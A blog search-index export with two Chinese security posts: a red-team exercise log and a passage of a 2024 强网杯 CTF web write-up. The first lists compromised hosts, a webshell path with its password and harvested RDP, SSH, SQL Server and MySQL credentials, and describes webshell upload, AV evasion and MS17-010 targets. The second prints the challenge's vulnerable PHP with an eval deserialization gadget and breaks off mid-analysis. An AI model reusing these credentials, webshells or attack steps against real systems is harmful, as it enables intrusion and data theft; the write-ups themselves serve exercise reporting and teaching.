<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2024市护小记</title>
    <url>/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/</url>
    <content><![CDATA[<p>年前参与市护，第一次并在攻防演练取得战果，仅做记录</p>
<h2 id="两台云主机"><a href="#两台云主机" class="headerlink" title="两台云主机"></a>两台云主机</h2><h3 id="一"><a href="#一" class="headerlink" title="一"></a>一</h3><p>入口点</p>
<p>公网通过某系统通用弱口令拿到 Web 网站</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250306101950101.png" class title="image-20250306101950101">

<p>翻阅站点，发现一处文件上传接口，简单绕过一下防护就上传成功</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250305212110280.png" class title="image-20250305212110280">

<p>上传 aspx 马，连接失败，判断应该是被 Defender 拦了解析失败，后续进入系统发现没杀软</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250305212721356.png" class title="image-20250305212721356">

<p>通过工具制作免杀马再次上传，连接成功</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250305213007147.png" class title="image-20250305213007147">

<p>上线CS</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250305213356723.png" class title="image-20250305213356723">

<p>提权至系统最高权限</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250305213447863.png" class title="image-20250305213447863">

<p>对内网进行侦察，带一带扫描，可惜没有发现其他主机</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250305214606906.png" class title="image-20250305214606906">

<p>权限级已经至顶，拿下 3389 远程桌面</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250305214832698.png" class title="image-20250305214832698">

<p>还有数据库，忘记截图，只是一台云主机，没有内网，遗憾收手。</p>
<h3 id="二"><a href="#二" class="headerlink" title="二"></a>二</h3><p>主页</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250306101737191.png" class title="image-20250306101737191">

<p>发现该系统存在 Structs2-016，工具利用，拿下该系统</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250305215704469.png" class title="image-20250305215704469">

<p>文件浏览</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250305220135346.png" class title="image-20250305220135346">

<p>拿到 SQLServer 管理员账号密码</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.username=sa</span><br><span class="line">db.password=jack_2014</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250305220337734.png" class title="image-20250305220337734">





<h2 id="某网关"><a href="#某网关" class="headerlink" title="某网关"></a>某网关</h2><p>某网关存在命令执行漏洞，通过漏洞拿到 Shell，且执行权限直接为 root</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://x:8443/webui/.xxx.php   密码：cmd</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250305220723939.png" class title="image-20250305220723939">

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250305220744648.png" class title="image-20250305220744648">

<h3 id="双网卡主机，突破逻辑隔离"><a href="#双网卡主机，突破逻辑隔离" class="headerlink" title="双网卡主机，突破逻辑隔离"></a>双网卡主机，突破逻辑隔离</h3><p>突破逻辑隔离，拿到双网卡主机，进入核心业务区之后就是酷酷乱扫，小企业的内网比较脆弱</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250306100910479.png" class title="image-20250306100910479">

<h3 id="内网沦陷，二十台主机权限"><a href="#内网沦陷，二十台主机权限" class="headerlink" title="内网沦陷，二十台主机权限"></a>内网沦陷，二十台主机权限</h3><p>后面数量过多，就放一张图片好了</p>
<p><strong>两台远程桌面</strong></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.0.200 Administrator Admin12345</span><br><span class="line">192.168.0.123 Administrator Admin123</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250306101022986.png" class title="image-20250306101022986">

<p><strong>5 x SSH 连接</strong> </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">SSH:192.168.10.252:22:root 123456</span><br><span class="line">SSH:192.168.0.207:22:admin admin</span><br><span class="line">SSH:192.168.0.206:22:admin password</span><br><span class="line">SSH:192.168.0.205:22:admin password</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250305221454516.png" class title="image-20250305221454516">

<p><strong>13 x 永恒之蓝</strong></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.60.145      MS17-010        (Windows 5.1)</span><br><span class="line">192.168.60.55       MS17-010        (Windows 5.1)</span><br><span class="line">192.168.60.168      MS17-010        (Windows 5.1)</span><br><span class="line">192.168.80.89       MS17-010        (Windows 7 Ultimate 7601 Service Pack 1)</span><br><span class="line">192.168.0.230       MS17-010        (Windows Server 2012 R2 Datacenter 9600)</span><br><span class="line">192.168.60.84       MS17-010        (Windows 7 Ultimate 7601 Service Pack 1)</span><br><span class="line">192.168.20.24       MS17-010        (Windows 7 Ultimate 7601 Service Pack 1)</span><br><span class="line">192.168.20.112      MS17-010        (Windows 7 Ultimate 7601 Service Pack 1)</span><br><span class="line">192.168.60.53       MS17-010        (Windows 7 Ultimate 7601 Service Pack 1)</span><br><span class="line">192.168.80.128      MS17-010        (Windows 7 Ultimate 7601 Service Pack 1)</span><br><span class="line">192.168.0.250       MS17-010        (Windows Server 2008 R2 Enterprise 7600)</span><br><span class="line">192.168.60.188      MS17-010        (Windows 7 Ultimate 7601 Service Pack 1)</span><br><span class="line">192.168.100.208     MS17-010        (Windows 7 Ultimate 7601 Service Pack 1)</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250306101129833.png" class title="image-20250306101129833">

<p>FTP 服务器</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp://192.168.0.123:21:anonymous</span><br><span class="line">   8uftp_V3.8.2.0_setup.1419410889.exe</span><br><span class="line">ftp://192.168.10.60:21:anonymous</span><br><span class="line">ftp://192.168.60.197:21:anonymous</span><br><span class="line">ftp://192.168.60.115:21:anonymous</span><br><span class="line">ftp://192.168.60.105:21:anonymous</span><br><span class="line">ftp://192.168.60.124:21:anonymous</span><br><span class="line">ftp://192.168.60.155:21:anonymous</span><br><span class="line">ftp://192.168.60.75:21:anonymous</span><br><span class="line">ftp://192.168.60.103:21:anonymous</span><br><span class="line">ftp://192.168.0.88:21:anonymous</span><br><span class="line">ftp://192.168.0.215:21:anonymous</span><br><span class="line">ftp://192.168.60.123:21:anonymous</span><br><span class="line">ftp://192.168.60.129:21:anonymous</span><br><span class="line">ftp://192.168.60.10:21:anonymous</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250306101144326.png" class title="image-20250306101144326">

<p>MYSQL 数据库</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql:192.168.0.123:3306:root 123</span><br><span class="line">mssql:192.168.0.236:1433:sa 123</span><br><span class="line">mysql:192.168.0.200:3306:root 123</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250306101306256.png" class title="image-20250306101306256">



<h2 id="帆软反序列化RCE-主机权限"><a href="#帆软反序列化RCE-主机权限" class="headerlink" title="帆软反序列化RCE 主机权限"></a>帆软反序列化RCE 主机权限</h2><p>后面还发现一个存在帆软反序列化 RCE 漏洞的系统，直接 root，可惜已经没时间进内网了</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%B8%82%E6%8A%A4%E5%B0%8F%E8%AE%B0/image-20250306101512096.png" class title="image-20250306101512096">







]]></content>
      <categories>
        <category>攻防演练</category>
      </categories>
      <tags>
        <tag>攻防</tag>
      </tags>
  </entry>
  <entry>
    <title>2024强网杯部分Web复现</title>
    <url>/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="2024-强网杯-platform"><a href="#2024-强网杯-platform" class="headerlink" title="[2024 强网杯]platform"></a>[2024 强网杯]platform</h2><p><strong>考点：Session反序列化、字符串溢出减少</strong></p>
<p>扫描目录得到源码</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/www.zip</span><br></pre></td></tr></table></figure></div>

<p>源码如下</p>
<p>index.php</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">require &#x27;user.php&#x27;;</span><br><span class="line">require &#x27;class.php&#x27;;</span><br><span class="line"></span><br><span class="line">$sessionManager = new SessionManager();</span><br><span class="line">$SessionRandom = new SessionRandom();</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27;) &#123;</span><br><span class="line">    $username = $_POST[&#x27;username&#x27;];</span><br><span class="line">    $password = $_POST[&#x27;password&#x27;];</span><br><span class="line"></span><br><span class="line">    $_SESSION[&#x27;user&#x27;] = $username;</span><br><span class="line"></span><br><span class="line">    if (!isset($_SESSION[&#x27;session_key&#x27;])) &#123;</span><br><span class="line">        $_SESSION[&#x27;session_key&#x27;] =$SessionRandom -&gt; generateRandomString();</span><br><span class="line">    &#125;</span><br><span class="line">    $_SESSION[&#x27;password&#x27;] = $password;</span><br><span class="line">    $result = $sessionManager-&gt;filterSensitiveFunctions();</span><br><span class="line">    header(&#x27;Location: dashboard.php&#x27;);</span><br><span class="line">    exit();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    require &#x27;login.php&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>class.php</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class notouchitsclass &#123;</span><br><span class="line">    public $data;</span><br><span class="line">    public function __construct($data) &#123;</span><br><span class="line">        $this-&gt;data = $data;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        eval($this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class SessionRandom &#123;</span><br><span class="line">    public function generateRandomString() &#123;</span><br><span class="line">    $length = rand(1, 50);</span><br><span class="line"></span><br><span class="line">    $characters = &#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;;</span><br><span class="line">    $charactersLength = strlen($characters);</span><br><span class="line">    $randomString = &#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">    for ($i = 0; $i &lt; $length; $i++) &#123;</span><br><span class="line">        $randomString .= $characters[rand(0, $charactersLength - 1)];</span><br><span class="line">    &#125;</span><br><span class="line">    return $randomString;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class SessionManager &#123;</span><br><span class="line">    private $sessionPath;</span><br><span class="line">    private $sessionId;</span><br><span class="line">    private $sensitiveFunctions = [&#x27;system&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;passthru&#x27;, &#x27;shell_exec&#x27;, &#x27;popen&#x27;, &#x27;proc_open&#x27;];</span><br><span class="line"></span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        if (session_status() == PHP_SESSION_NONE) &#123;</span><br><span class="line">            throw new Exception(&quot;Session has not been started. Please start a session before using this class.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;sessionPath = session_save_path();</span><br><span class="line">        $this-&gt;sessionId = session_id();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function getSessionFilePath() &#123;</span><br><span class="line">        return $this-&gt;sessionPath . &quot;/sess_&quot; . $this-&gt;sessionId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function filterSensitiveFunctions() &#123;</span><br><span class="line">        $sessionFile = $this-&gt;getSessionFilePath();</span><br><span class="line"></span><br><span class="line">        if (file_exists($sessionFile)) &#123;</span><br><span class="line">            $sessionData = file_get_contents($sessionFile);</span><br><span class="line"></span><br><span class="line">            foreach ($this-&gt;sensitiveFunctions as $function) &#123;</span><br><span class="line">                if (strpos($sessionData, $function) !== false) &#123;</span><br><span class="line">                    $sessionData = str_replace($function, &#x27;&#x27;, $sessionData);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            file_put_contents($sessionFile, $sessionData);</span><br><span class="line"></span><br><span class="line">            return &quot;Sensitive functions have been filtered from the session file.&quot;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return &quot;Session file not found.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>login.php</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;用户登录&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body &#123;</span><br><span class="line">            background-color: #f0f4f8;</span><br><span class="line">            font-family: Arial, sans-serif;</span><br><span class="line">            display: flex;</span><br><span class="line">            justify-content: center;</span><br><span class="line">            align-items: center;</span><br><span class="line">            height: 100vh;</span><br><span class="line">            margin: 0;</span><br><span class="line">        &#125;</span><br><span class="line">        h1 &#123;</span><br><span class="line">            text-align: center;</span><br><span class="line">            color: #333;</span><br><span class="line">            margin-bottom: 20px;</span><br><span class="line">        &#125;</span><br><span class="line">        .login-container &#123;</span><br><span class="line">            background-color: #fff;</span><br><span class="line">            border-radius: 10px;</span><br><span class="line">            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);</span><br><span class="line">            padding: 30px;</span><br><span class="line">            width: 300px;</span><br><span class="line">        &#125;</span><br><span class="line">        label &#123;</span><br><span class="line">            display: block;</span><br><span class="line">            margin-bottom: 5px;</span><br><span class="line">            color: #555;</span><br><span class="line">        &#125;</span><br><span class="line">        input[type=&quot;text&quot;],</span><br><span class="line">        input[type=&quot;password&quot;] &#123;</span><br><span class="line">            width: 100%;</span><br><span class="line">            padding: 10px;</span><br><span class="line">            margin-bottom: 15px;</span><br><span class="line">            border: 1px solid #ddd;</span><br><span class="line">            border-radius: 5px;</span><br><span class="line">            box-sizing: border-box;</span><br><span class="line">        &#125;</span><br><span class="line">        input[type=&quot;submit&quot;] &#123;</span><br><span class="line">            background-color: #007BFF;</span><br><span class="line">            color: white;</span><br><span class="line">            border: none;</span><br><span class="line">            padding: 10px;</span><br><span class="line">            border-radius: 5px;</span><br><span class="line">            cursor: pointer;</span><br><span class="line">            width: 100%;</span><br><span class="line">            font-size: 16px;</span><br><span class="line">        &#125;</span><br><span class="line">        input[type=&quot;submit&quot;]:hover &#123;</span><br><span class="line">            background-color: #0056b3;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;login-container&quot;&gt;</span><br><span class="line">        &lt;h1&gt;用户登录&lt;/h1&gt;</span><br><span class="line">        &lt;form action=&quot;index.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">            &lt;label for=&quot;username&quot;&gt;用户名:&lt;/label&gt;</span><br><span class="line">            &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;</span><br><span class="line">            &lt;label for=&quot;password&quot;&gt;密码:&lt;/label&gt;</span><br><span class="line">            &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;</span><br><span class="line">            &lt;input type=&quot;submit&quot; value=&quot;登录&quot;&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>

<p>dashborad.php</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&quot;class.php&quot;);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">if (!isset($_SESSION[&#x27;user&#x27;])) &#123;</span><br><span class="line">    header(&#x27;Location: login.php&#x27;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;任何人都可以登录的平台&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body &#123;</span><br><span class="line">            background-color: #f0f4f8;</span><br><span class="line">            font-family: Arial, sans-serif;</span><br><span class="line">            display: flex;</span><br><span class="line">            flex-direction: column;</span><br><span class="line">            align-items: center;</span><br><span class="line">            justify-content: center;</span><br><span class="line">            height: 100vh;</span><br><span class="line">            margin: 0;</span><br><span class="line">            text-align: center;</span><br><span class="line">        &#125;</span><br><span class="line">        h1 &#123;</span><br><span class="line">            color: #333;</span><br><span class="line">            margin-bottom: 20px;</span><br><span class="line">        &#125;</span><br><span class="line">        p &#123;</span><br><span class="line">            color: #555;</span><br><span class="line">            font-size: 18px;</span><br><span class="line">            margin: 0;</span><br><span class="line">        &#125;</span><br><span class="line">        .session-info &#123;</span><br><span class="line">            background-color: #fff;</span><br><span class="line">            border-radius: 10px;</span><br><span class="line">            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);</span><br><span class="line">            padding: 20px;</span><br><span class="line">            width: 300px;</span><br><span class="line">            margin-top: 20px;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;欢迎来到任何人都可以登录的平台&lt;/h1&gt;</span><br><span class="line">    &lt;div class=&quot;session-info&quot;&gt;</span><br><span class="line">        &lt;p&gt;你好，&lt;?php echo htmlspecialchars($_SESSION[&#x27;user&#x27;]); ?&gt;！&lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>

<p>user.php</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class User &#123;</span><br><span class="line">    private $validUser = [</span><br><span class="line">        &#x27;username&#x27; =&gt; &#x27;admin&#x27;,</span><br><span class="line">        &#x27;password&#x27; =&gt; &#x27;password&#x27;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    public function authenticate($username, $password) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241105200845953.png" class title="image-20241105200845953">

<p>随意登录</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241105200856834.png" class title="image-20241105200856834">

<p>搭建 <code>docker</code> 进行本地调试</p>
<p><strong>首先对解题思路进行分析</strong></p>
<p>当访问 <code>index.php</code> 时，会将多个信息存入 <code>session</code> 中，根据 <code>php</code> 中<code>session</code> 的机制，这些信息会存储在本地文件内</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">//index.php</span><br><span class="line">if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27;) &#123;</span><br><span class="line">    $username = $_POST[&#x27;username&#x27;];</span><br><span class="line">    $password = $_POST[&#x27;password&#x27;];</span><br><span class="line"></span><br><span class="line">    $_SESSION[&#x27;user&#x27;] = $username;</span><br><span class="line"></span><br><span class="line">    if (!isset($_SESSION[&#x27;session_key&#x27;])) &#123;</span><br><span class="line">        $_SESSION[&#x27;session_key&#x27;] =$SessionRandom -&gt; generateRandomString();</span><br><span class="line">    &#125;</span><br><span class="line">    $_SESSION[&#x27;password&#x27;] = $password;</span><br></pre></td></tr></table></figure></div>

<p><code>$SessionRandom -&gt; generateRandomString()</code> 的作用，是调用 <code>class.php</code> 中 <code>SessionRandom</code> 的 <code>generateRandomString()</code> 函数，这个函数会按照给定的字符生成一个一些随机值并返回</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">class SessionRandom &#123;</span><br><span class="line">    public function generateRandomString() &#123;</span><br><span class="line">    $length = rand(1, 50);</span><br><span class="line"></span><br><span class="line">    $characters = &#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;;</span><br><span class="line">    $charactersLength = strlen($characters);</span><br><span class="line">    $randomString = &#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">    for ($i = 0; $i &lt; $length; $i++) &#123;</span><br><span class="line">        $randomString .= $characters[rand(0, $charactersLength - 1)];</span><br><span class="line">    &#125;</span><br><span class="line">    return $randomString;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>当直接访问 <code>index.php</code> ，不输入账号密码时</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241105202017717.png" class title="image-20241105202017717">

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241105202050883.png" class title="image-20241105202050883">

<p>当输入账号密码时，可以看到信息都被存入 <code>session</code> 文件中</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin/admin</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241105202157274.png" class title="image-20241105202157274">

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241105202346170.png" class title="image-20241105202346170">

<p>然后看 <code>class.php</code> ，这个文件内容是关于一些自定义函数和魔术方法，当访问 <code>index.php</code> ，就会触发 <code>class.php</code> 的 <code>SessionMaganer-&gt;filterSesnsitiveFunctions()</code> </p>
<p>关键点在这里，会对 <code>session</code> 文件内容进行替换，假如匹配到指定字符串则替换为空，存在<strong>字符串溢出减少漏洞</strong> </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">private $sensitiveFunctions = [&#x27;system&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;passthru&#x27;, &#x27;shell_exec&#x27;, &#x27;popen&#x27;, &#x27;proc_open&#x27;];</span><br><span class="line">....</span><br><span class="line">foreach ($this-&gt;sensitiveFunctions as $function) &#123;</span><br><span class="line">                if (strpos($sessionData, $function) !== false) &#123;</span><br><span class="line">                    $sessionData = str_replace($function, &#x27;&#x27;, $sessionData);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></div>

<p>继续看 <code>class.php</code> ，<code>notouchitsclass</code> 对象中存在 <code>eval()</code> 函数，当反序列化时会触发，结合前面的 <code>session</code> 内容写入，可以总结出生成序列化字符串写入 <code>session</code> 中，然后反序列化的思路</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">class notouchitsclass &#123;</span><br><span class="line">    public $data;</span><br><span class="line">    public function __construct($data) &#123;</span><br><span class="line">        $this-&gt;data = $data;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        eval($this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>接下来就是找到反序列化的点，哪里会将程序进行反序列化：</p>
<p>在 <code>dashboard.php</code> 存在中 <code>session_start()</code> 函数，要读取 <code>session</code> 文件，就得在读取时进行反序列化</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">...</span><br><span class="line">session_start();</span><br><span class="line">...</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>在本地继续测试，输入 <code>admin/system</code> ，按照源码，<code>system</code> 本应该会被替换为空，但是看到本地实际上 <code>session</code> 文件中 <code>password</code> 仍然为 <code>system</code>  </p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241105210402393.png" class title="image-20241105210402393">

<p>修改程序进一步调试</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241105212708611.png" class>

<p>再次发包，看到 <code>sessionFile</code> 得到的值为 <code>/sess_abc</code> ，而本地内部默认存储的是 <code>/tmp/sess_xx</code> 路径，因此本地的程序并不像理论上的进行运行</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241105212803227.png" class title="image-20241105212803227">

<p>找到问题，给 <code>$sessionPath</code> 赋值上 <code>/tmp</code> 即可 </p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241105213302484.png" class title="image-20241105213302484">

<p>再次发包，本地的 <code>system</code> 被正确替换了</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241105213756379.png" class title="image-20241105213756379">

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241105213835905.png" class title="image-20241105213835905">

<p>这里字符串溢出就很明显，字符被替换为空，但前面的数字不变</p>
